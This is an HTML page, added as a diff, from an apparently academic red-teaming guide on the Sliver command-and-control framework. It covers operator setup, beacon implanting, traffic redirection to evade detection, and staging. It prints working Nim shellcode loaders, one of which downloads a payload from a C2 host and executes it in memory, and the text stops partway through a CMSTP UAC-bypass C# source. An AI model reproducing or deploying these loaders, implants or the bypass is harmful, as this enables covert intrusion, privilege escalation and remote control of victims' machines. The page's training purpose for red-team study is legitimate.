@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="canonical" href="http://ab8910.pages.labranet.jamk.fi/5-local-privilege-escalation/sliver/sliver/" />
+      <link rel="shortcut icon" href="../../../img/favicon.ico" />
+    <title>Sliver - Red-Teaming Tools Usage Guide</title>
+    <link rel="stylesheet" href="../../../css/theme.css" />
+    <link rel="stylesheet" href="../../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Sliver";
+        var mkdocs_page_input_path = "5-local-privilege-escalation/sliver/sliver.md";
+        var mkdocs_page_url = "/5-local-privilege-escalation/sliver/sliver/";
+      </script>
+    
+    <script src="../../../js/jquery-3.6.0.min.js" defer></script>
+    <!--[if lt IE 9]>
+      <script src="../../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+      <script>hljs.initHighlightingOnLoad();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../../.." class="icon icon-home"> Red-Teaming Tools Usage Guide
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../../..">Home</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Preparation</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../1-preparation/phases/">Attack Chain</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Reconnaissance</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../2-recon/hak5/hak5/">Shark Jack</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Initial Access</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../4-initial-access/phishing/bitb/bitb/">Browser-in-Browser</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../4-initial-access/phishing/evilnovnc/EvilnoVNC/">EvilNoVNC</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../4-initial-access/phishing/dll-hijack/dll-hijack/">DLL Hijack</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Local Privilege Escalation</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../localpotato/LocPotato/">LocalPotato</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../storsvc-privesc/storsvc_privesc/">StorSvc Abuse</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../sigflip/sigflip/">SigLoader</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Command and Control</span></p>
+              <ul class="current">
+                  <li class="toctree-l1 current"><a class="reference internal current" href="./">Sliver</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#background">Background</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#features">Features</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#installation">Installation</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#server-and-client-setup">Server and client setup</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#beacon-setup">Beacon setup</a>
+    </li>
+    </ul>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Credential Access</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../3-resource-development/keepass-password-dumper/keepass/">Keepass Password Dumper</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Domain Privilege Escalation</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../7-privilege-escalation/sam-the-admin/sam-the-admin/">SAM the Admin</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../..">Red-Teaming Tools Usage Guide</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../../.." class="icon icon-home" alt="Docs"></a> &raquo;</li>
+          <li>Command and Control &raquo;</li>
+      <li>Sliver</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="sliver">Sliver</h1>
+<h2 id="background">Background</h2>
+<p>Sliver is an open-source adversary emulation/red team framework and is an alternative to Cobalt Strike. The tool can be utilized by organizations of any scale for conducting post-exploitation security testing. Sliver's implants have built-in support for communication channels such as mutual TLS (mTLS), WireGuard, HTTP(S), and DNS. They are compiled on the fly using unique encryption keys for each binary.</p>
+<p>Server and client components of Sliver are compatible with MacOS, Windows, and Linux operating systems. They also function with other Golang compiler targets, although testing is in this case  not comprehensive. The tool is undetected in the FireEye EDR. </p>
+<h2 id="features">Features</h2>
+<p>The tool includes a wide range of features. A notable feature is the 'multipayer' mode, which allows multiple operators to connect to the same server beacon. This is especially useful in large-scale red-teaming environments where coordination is necessary. Operators and server connections are authenticated using mTLS. Certificates are managed automaticaly by Sliver. It is fully scriptable with Java/Typescript. See the Sliver <a href="https://github.com/BishopFox/sliver">Github</a> for a more detailed breakdown.</p>
+<h2 id="installation">Installation</h2>
+<p>The installation process is straightforward. The most reliable method is to download the latest server and client binaries from the Sliver <a href="https://github.com/BishopFox/sliver/releases">release</a> page. Begin by changing user rights with <code>chmod +x sliver*</code> and run the server file by entering the following:</p>
+<pre><code>./sliver-server
+</code></pre>
+<p><img alt="" src="../images/1-sliver-bin.PNG" /></p>
+<h2 id="server-and-client-setup">Server and client setup</h2>
+<ol>
+<li>
+<p>Set up a server in the /tmp directory with the command <code>python3 -m  http.server 8000</code>.</p>
+</li>
+<li>
+<p>Create a new operator profile. </p>
+</li>
+</ol>
+<pre><code>./sliver-server_linux operator --name [OPERATOR] --lhost [IP ADDRESS] --save [OPERATOR].cfg
+</code></pre>
+<p><img alt="" src="../images/2-config-operator.png" /></p>
+<p>This feature is useful because it allows multiple operators to connect to the same server. The .cfg file is placed in /root by default. </p>
+<ol>
+<li>Import the profile into relevant folder using the <code>./sliver-client_linux import [OPERATOR].cfg</code> command.</li>
+</ol>
+<p><img alt="" src="../images/3-import-operator.png" /></p>
+<ol>
+<li>Additional operators are created on the server. Profiles can be exported to the player with SCP. The command <code>scp [OPERATOR].cfg kali@[ADDRESS]:</code> is used.</li>
+</ol>
+<p><img alt="" src="../images/4-export-operator.png" /></p>
+<ol>
+<li>
+<p>Operators import the profile using the command <code>import [OPERATOR].cfg</code>.</p>
+</li>
+<li>
+<p>Enable Multiplayer mode on the server with the command <code>multiplayer</code>. Operators can be viewed by entering the <code>operator</code> command. </p>
+</li>
+</ol>
+<p><img alt="" src="../images/5-multiplayer.png" /></p>
+<ol>
+<li>Operators enter enter the game when they run the client server. </li>
+</ol>
+<p><img alt="" src="../images/6-join-game.png" /></p>
+<p><img alt="Operator list" src="../images/7-operators.png" /></p>
+<h2 id="beacon-setup">Beacon setup</h2>
+<ol>
+<li>Generate beacons on the Sliver server with the following command: </li>
+</ol>
+<pre><code>generate beacon --mtls [IP ADDRESS] --save /tmp/[BEACON NAME] --skip-symbols -f exe --os windows
+</code></pre>
+<p><img alt="" src="../images/8-mtls-beacon.PNG" /></p>
+<ol>
+<li>Implant the beacon on the target machine. The most convenent implantation method is to set up a browser-accessible server. As before, this can be done in the /tmp directory with the command <code>python3 -m  http.server [PORT NUMBER]</code>. Port 8080 was used in this example. For Windows-based targets it is recommended to use the .exe extension when naming the beacon.  </li>
+</ol>
+<p><img alt="" src="../images/9-target-server-beacon.png" /></p>
+<ol>
+<li>Save and run the beacon file from the local drive. </li>
+</ol>
+<p><img alt="" src="../images/10-run-beacon-implant.png" /></p>
+<ol>
+<li>Initialise an mTLS session on the server. Addtional arguments were used in the example below, but the session will also start simply by using the <code>mtls</code> command. The implant beacon will appear in the session once the beacon file on the target machine has been executed locally (i.e., double-clicked).</li>
+</ol>
+<p><img alt="" src="../images/11-mtls-listener.png" /></p>
+<ol>
+<li>Implants are viewable with the <code>implants</code> command.</li>
+</ol>
+<p><img alt="" src="../images/12-view-implants.PNG" /></p>
+<ol>
+<li>The command <code>interactive</code> can be used to select the current C2 channel. </li>
+</ol>
+<p><img alt="" src="../images/13-interactive-beacon-selection.PNG" /></p>
+<p>Alternativey, the command <code>use</code> can be deployed to select the session from a list. </p>
+<p><img alt="" src="../images/14-use-beacon.PNG" /></p>
+<ol>
+<li>Once the session is selected it is possible to navigate the target machine's file system. </li>
+</ol>
+<p><img alt="" src="../images/15-target-machine.PNG" /></p>
+<p>The session will persist until the beacon is removed. It is accessible via both the server and the client. </p>
+<ol>
+<li>The <code>help</code> keyword displays the possible range of commands.</li>
+</ol>
+<p><img alt="" src="../images/16-help.png" /></p>
+<h1 id="usage">Usage</h1>
+<h1 id="1-modules">1. Modules</h1>
+<p>Sliver modules offer a wide range of attack vectors and can be accessed with the <code>armory</code> command.</p>
+<p><img alt="" src="../images/17-modules.PNG" /></p>
+<p>Armory modules can be installed with the <code>armory install [MODULE NAME]</code> command. </p>
+<p><img alt="" src="../images/18-armory-module-install.PNG" /></p>
+<p>Usage instructions can be accessed with the <code>[MODULE NAME] -h</code> command.   </p>
+<p><img alt="" src="../images/19-armory-module-usage-help.PNG" /></p>
+<h1 id="2-advanced-usage">2 Advanced Usage</h1>
+<h2 id="21-traffic-redirection">2.1 Traffic redirection</h2>
+<p>Command and control (C2) infrastructure is used to communicate with compromised systems and maintain control over them. C2 traffic redirection enables attackers to control C2 traffic within the target environment. </p>
+<p>Traffic redirectors help attackers evade detection and bypass security controls designed to detect or block malicious C2 traffic. They enable attackers to obfuscate their activities and make it harder for security systems to identify and block their actions.</p>
+<p>Setting up a traffic redirector in Silver requires the installation of a dedicated server. This can be done with Apache or NGINX, but the process is simplest in Caddy. </p>
+<h2 id="caddy">Caddy</h2>
+<h3 id="installation_1">Installation</h3>
+<p>On Debian-based systems Caddy can be installed with the following commands:</p>
+<pre><code>sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https
+curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg
+curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/caddy-stable.list
+sudo apt update
+sudo apt install caddy
+</code></pre>
+<h3 id="server-setup">Server setup</h3>
+<p>Caddy configuration is handled by the Caddyfile located in <code>/etc/caddy</code>. The file requires only two modifications. </p>
+<p><img alt="" src="../images/reverse-proxy/1-caddyfile-config.PNG" /></p>
+<p>The topmost domain is the site targeted for redirection. The domain following the <code>redir</code> command is the destination URL and port to where requests will be redirected. The <code>{uri}</code> placeholder preserves the original path and query parameters in the redirect. mTLS requests in Sliver are sent over port 8888. The redirect port should be set to this number when using Sliver's mTLS listener. The port number for the target domain should be unique. </p>
+<p>The caddy server is started by issuing the  <code>caddy start</code> command.</p>
+<p><img alt="" src="../images/reverse-proxy/2-caddy-start.PNG" /></p>
+<p>The standard Sliver beacon setup procedure can be used once the Caddy server is up and running:</p>
+<ol>
+<li>
+<p>Generate beacon: <code>generate beacon --mtls 198.18.103.67 --save /tmp/caddy_beacon.exe --skip-symbols -f exe --os windows</code></p>
+</li>
+<li>
+<p>Start mTLS listener: <code>mtls</code></p>
+</li>
+<li>
+<p>Set up a server accessible on the target machine: <code>python3 -m http.server [UNIQUE PORT NUMBER]</code></p>
+</li>
+<li>
+<p>Navigate to the server page in the bowser on the target machine. In this example, the page is located at <code>198.18.107.63:8081</code>.</p>
+</li>
+</ol>
+<p><img alt="" src="../images/reverse-proxy/7-python-server.PNG" /></p>
+<ol>
+<li>
+<p>Implant the beacon on the target machine by downloading and executing the file generated in step 1.</p>
+</li>
+<li>
+<p>The beacon is displayed in the Sliver UI after the beacon file has been executed.</p>
+</li>
+</ol>
+<p><img alt="" src="../images/reverse-proxy/3-mtls-listener-beacon.PNG" /></p>
+<ol>
+<li>Select beacon with the command <code>use</code>. The session can be upgraded with the <code>interactive</code> command.</li>
+</ol>
+<p><img alt="" src="../images/reverse-proxy/5-use-beacon.png" /></p>
+<ol>
+<li>The command <code>beacons</code> displays the available beacons. Active beacons are displayed in green. The reverse proxy is set up correctly if the beacon calls back to the back to the server at given intervals. Inactive beacons are displayed in red. </li>
+</ol>
+<p><img alt="" src="../images/reverse-proxy/6-beacon-check-in.png" /></p>
+<p>In Nestat:</p>
+<p><img alt="" src="../images/reverse-proxy/8-netstat-redirect.PNG" /></p>
+<h2 id="22-staging">2.2 Staging</h2>
+<p>Sliver payloads can be large. As such, a stager can be used to execute an implant on a target. A stager is a small program or script that fetches the main payload from a remote location. While size doesn't matter as much in computing world anymore, hiding a full-sized implant can be difficult in certain circumstances.  </p>
+<p>Sliver can generate stagers or a custom one can be used.</p>
+<p>The following is needed to set up a stager in Sliver:  </p>
+<ol>
+<li>A staging server (Your sliver server)</li>
+<li>A stage 2 payload (the main sliver payload, typically in shellcode)</li>
+<li>The stager (Can be generated with the <code>generate stager</code> command or custom-made)  </li>
+</ol>
+<h3 id="stager-setup">Stager setup</h3>
+<p>Sliver staging uses the profiles feature. Profiles work as implant blueprints that define configuration information. Profiles can be created with <code>profiles new</code> command.</p>
+<p>In this example, we will serve an mTLS implant.  </p>
+<pre><code>sliver &gt; profiles new --mtls 198.18.103.68 --format shellcode win-shellcode
+
+[*] Saved new implant profile win-shellcode
+
+sliver &gt; profiles
+
+ Profile Name    Implant Type   Platform        Command &amp; Control               Debug   Format      Obfuscation   Limitations 
+=============== ============== =============== =============================== ======= =========== ============= =============
+ win-shellcode   session        windows/amd64   [1] mtls://198.18.103.68:8888   false   SHELLCODE   enabled                                    
+
+sliver &gt;  
+</code></pre>
+<p>With the profile setup, a listener for the mTLS implant is required.  </p>
+<pre><code>sliver &gt; mtls
+
+[*] Starting mTLS listener ...
+[*] Successfully started job #1
+
+sliver &gt; jobs
+
+ ID   Name   Protocol   Port 
+==== ====== ========== ======
+ 1    mtls   tcp        8888
+</code></pre>
+<p>A staging listener can then be created with the <code>stage-listener</code> command and linked to a new profile:  </p>
+<pre><code>sliver &gt; stage-listener --url http://198.18.103.68:80 --profile win-shellcode
+
+[*] No builds found for profile win-shellcode, generating a new one
+[*] Job 1 (tcp) started
+sliver &gt; jobs
+
+ID  Name  Protocol  Port  
+==  ====  ========  ====  
+1   http  tcp       80  
+2   mtls  tcp       8888 
+</code></pre>
+<p>Now we're ready to create our stager. This can be done with the <code>generate stager</code> command. A local host and port should be specified to know where the stage listener is.  </p>
+<pre><code>sliver &gt; generate stager --lhost 198.18.103.68 --lport 80 --protocol http --save /tmp
+
+[*] Sliver stager saved to: /tmp/NEAT_SNOWPLOW
+</code></pre>
+<p>If this results in an RPC error it is likely that Sliver's payload generator is out of date. The error can be resolved by updating Kali with the commands <code>sudo apt update</code>, followed by <code>sudo apt upgrade</code>.</p>
+<p>With the stager generated, we can take a look at the results:  </p>
+<pre><code>┌──(kali㉿kali-vle)-[~]
+└─$ cat /tmp/NEAT_SNOWPLOW 
+unsigned char buf[] = 
+&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;
+&quot;\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52&quot;
+...
+&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;
+</code></pre>
+<p>Sliver as of now won't generate anything that can just be double-clicked. Something to run shellcode needs to be built. This can be accomplished in a near infinite amount of ways. One method is demonstrated below.  </p>
+<h3 id="creating-the-stager">Creating the stager</h3>
+<p><a href="https://nim-lang.org/">Nim</a> can be used to create the stager. Nim is a statically typed compiled programming language that resembles Python and compiles to C, C++ and even JavaScript. </p>
+<p>This method uses Nim's <a href="https://github.com/khchen/winim">Winim</a> library that allows easy access Windows API definitions. It can be installed it with the command <code>nimble install winim</code>  </p>
+<pre><code>import winim/lean
+
+when defined(windows):
+
+    var shellcode: array[511, byte] = [
+        byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52
+    ,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52
+    ,0x20,0x51,0x56,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9
+    ,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41
+    ,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48
+    ,0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b
+    ,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x8b,0x48
+    ,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0x50,0xe3,0x56,0x48,0xff,0xc9,0x41
+    ,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0x41,0xc1,0xc9
+    ,0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45
+    ,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b
+    ,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58
+    ,0x48,0x01,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48
+    ,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9
+    ,0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00
+    ,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5
+    ,0x49,0xbc,0x02,0x00,0x1e,0x61,0xc6,0x12,0x67,0x44,0x41,0x54,0x49,0x89,0xe4
+    ,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68
+    ,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a
+    ,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89
+    ,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5
+    ,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba
+    ,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5
+    ,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9
+    ,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5
+    ,0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41
+    ,0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41
+    ,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31
+    ,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8
+    ,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40
+    ,0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5
+    ,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c
+    ,0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41
+    ,0xff,0xe7,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff
+    ,0xd5 ]
+
+    # Equilevant to Python's if __name__ == &quot;__main__&quot;
+    when isMainModule: 
+        let currentproc = GetCurrentProcessId()
+        echo &quot;Current process ID: &quot;, currentproc
+
+        # Allocate memory for our shellcode
+        let memPtr = VirtualAlloc(
+            nil,
+            cast[SIZE_T](shellcode.len),
+            MEM_COMMIT,
+            PAGE_EXECUTE_READ_WRITE
+        )
+
+        # Copy our shellcode to the memory section
+        CopyMemory(memPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len))
+
+        # Interesting way to execute our code, ref: https://github.com/HuskyHacks/RustyProcessInjectors/blob/master/EnumSystemGeoID/src/main.rs
+        EnumSystemGeoID(
+            16,
+            0,
+            cast[GEO_ENUMPROC](memPtr)
+        )
+</code></pre>
+<p>Compiling this program can be done on Linux if you have <a href="https://www.mingw-w64.org/">MinGW</a>. The command to compile it to Windows is <code>nim c --cpu:amd64 --os:windows --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc -d:release &lt;your stager&gt;.nim</code>  </p>
+<p>Running this binary on the target Windows machine results in the binary fetching the main Sliver payload from our server and executing it, giving us a session:  </p>
+<p><img alt="Sliver stager successful deployment" src="../images/staging/stager-success.jpg" />  </p>
+<p>Confirming the stager fetched the main payload can be done by viewing sliver.log file:  </p>
+<p><img alt="Sliver logs" src="../images/staging/stager-success2.jpg" />  </p>
+<h3 id="custom-stager-creation">Custom stager creation</h3>
+<p>Since the effort was made to create a binary to run the generated stager, why not go all the way and create a custom stager? This is easier than it sounds. Sliver has <a href="https://github.com/BishopFox/sliver/wiki/Stagers">documentation on how to make your own stager</a> on their Github page.  </p>
+<p>All we have to do is to fetch the payload being served on the Sliver server through the <code>stage-listener</code>. Viewing the <a href="https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2#implant_config">Sliver C2 documentation</a>, we see the Sliver serves the main payloads on the HTTP protocol when requesting any file with the <code>.woff</code> file extension. This can be tested by using something like <code>wget</code> on the sliver server and requesting a file such as <code>googlewebfront.woff</code>  </p>
+<pre><code>┌──(kali㉿kali-vle)-[~/nim/malzDev/Sliver-stage-0]
+└─$ wget localhost:80/googlewebfront.woff
+
+┌──(kali㉿kali-vle)-[~/nim/malzDev/Sliver-stage-0]
+└─$ cat googlewebfront.woff| xxd | head -n 3
+00000000: 3879 2f42 3f45 2847 2b4b 6250 6553 6841  8y/B?E(G+KbPeShA
+00000010: 848d 2a78 ce77 153b eaff aca8 d27a 0e69  ..*x.w.;.....z.i
+00000020: 2887 67c6 f0f0 f8d8 477d 8639 e58e 1d0c  (.g.....G}.9....
+
+</code></pre>
+<p>The stage listener returned the shellcode in the HTTP response. Now a simple client can be created that fetches the shellcode over HTTP(S) and executes it in memory:  </p>
+<pre><code>import std/httpclient
+import winim/lean
+import sequtils
+
+when defined(windows):
+
+    proc main(): void =
+        let currentproc = GetCurrentProcessId()
+        echo &quot;[*] Current process ID: &quot;, currentproc
+
+        var client = newHttpClient()
+        var response = client.getContent(&quot;http://198.18.103.68/googlewebfront.woff&quot;)
+
+        # Convert the downloaded implant from string to array
+        var bytes = response.toSeq()
+
+        # Allocate memory
+        let memPtr = VirtualAlloc(
+            nil,
+            cast[SIZE_T](bytes.len),
+            MEM_COMMIT,
+            PAGE_EXECUTE_READ_WRITE
+        )
+
+        # Copy our shellcode to the memory section
+        echo &quot;[*] Copying shellcode to memory...&quot;
+        CopyMemory(memPtr, addr(bytes[0]), cast[SIZE_T](bytes.len))
+
+
+        echo &quot;[*] Executing shellcode...&quot;
+        # Interesting way to exec our code, ref: https://github.com/HuskyHacks/RustyProcessInjectors/blob/master/EnumSystemGeoID/src/main.rs
+        EnumSystemGeoID(
+            16,
+            0,
+            cast[GEO_ENUMPROC](memPtr)
+        )
+
+
+    when isMainModule:
+        main()
+</code></pre>
+<p>Compiling this program and running it on a Windows target results in us getting the shell:<br />
+<img alt="Shell success" src="../images/staging/stager-success3.jpg" /> </p>
+<h2 id="23-privilege-escalation">2.3 Privilege escalation</h2>
+<p>It is possible to create system sessions in Sliver. On Windows machines it is necessary to bypass User Account Control (UAC) before a remote system session can be initialised. A relatively straightforward way to achieve this is with a reflective DLL injection. </p>
+<p>On the target machine do the following:</p>
+<ol>
+<li>Create a script called <code>Sources.cs</code> with the code below. Save it to a convenient location. </li>
+</ol>
+<pre><code>/* 
+UAC Bypass using CMSTP.exe microsoft binary
+
+Based on previous work from Oddvar Moe
+https://oddvar.moe/2017/08/15/research-on-cmstp-exe/
+
+And this PowerShell script of Tyler Applebaum
+https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1
+
+Code author: Andre Marques (@_zc00l)
+*/
+using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Windows;
+using System.Runtime.InteropServices;
+
+public class CMSTPBypass
+{
+    // Our .INF file data!
+    public static string InfData = @&quot;[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+
+[RunPreSetupCommandsSection]
+; Commands Here will be run Before Setup Begins to install
+REPLACE_COMMAND_LINE
+taskkill /IM cmstp.exe /F
+
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+
+[AllUSer_LDIDSection]
+&quot;&quot;HKLM&quot;&quot;, &quot;&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE&quot;&quot;, &quot;&quot;ProfileInstallPath&quot;&quot;, &quot;&quot;%UnexpectedError%&quot;&quot;, &quot;&quot;&quot;&quot;
+
+[Strings]
+ServiceName=&quot;&quot;CorpVPN&quot;&quot;
+ShortSvcName=&quot;&quot;CorpVPN&quot;&quot;
+
+&quot;;
+
+    [DllImport(&quot;user32.dll&quot;)] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport(&quot;user32.dll&quot;, SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
+
+    public static string BinaryPath = &quot;c:\\windows\\system32\\cmstp.exe&quot;;
+
+    /* Generates a random named .inf file with command to be executed with UAC privileges */
+    public static string SetInfFile(string CommandToExecute)
+    {
+        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar(&quot;.&quot;))[0];
+        string TemporaryDir = &quot;C:\\windows\\temp&quot;;
+        StringBuilder OutputFile = new StringBuilder();
+        OutputFile.Append(TemporaryDir);
+        OutputFile.Append(&quot;\\&quot;);
+        OutputFile.Append(RandomFileName);
+        OutputFile.Append(&quot;.inf&quot;);
+        StringBuilder newInfData = new StringBuilder(InfData);
+        newInfData.Replace(&quot;REPLACE_COMMAND_LINE&quot;, CommandToExecute);
+        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
+        return OutputFile.ToString();
+    }
+
+    public static bool Execute(string CommandToExecute)
+    {
+        if(!File.Exists(BinaryPath))
+        {
+            Console.WriteLine(&quot;Could not find cmstp.exe binary!&quot;);
+            return false;
+        }
+        StringBuilder InfFile = new StringBuilder();
+        InfFile.Append(SetInfFile(CommandToExecute));
+
+        Console.WriteLine(&quot;Payload file written to &quot; + InfFile.ToString());
+        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
+        startInfo.Arguments = &quot;/au &quot; + InfFile.ToString();
+        startInfo.UseShellExecute = false;
+        Process.Start(startInfo);
+
+        IntPtr windowHandle = new IntPtr();
+        windowHandle = IntPtr.Zero;
+        do {
+            windowHandle = SetWindowActive(&quot;cmstp&quot;);
+        } while (windowHandle == IntPtr.Zero);
+
+        System.Windows.Forms.SendKeys.SendWait(&quot;{ENTER}&quot;);
+        return true;
+    }
+
+    public static IntPtr SetWindowActive(string ProcessName)
+    {
+        Process[] target = Process.GetProcessesByName(ProcessName);
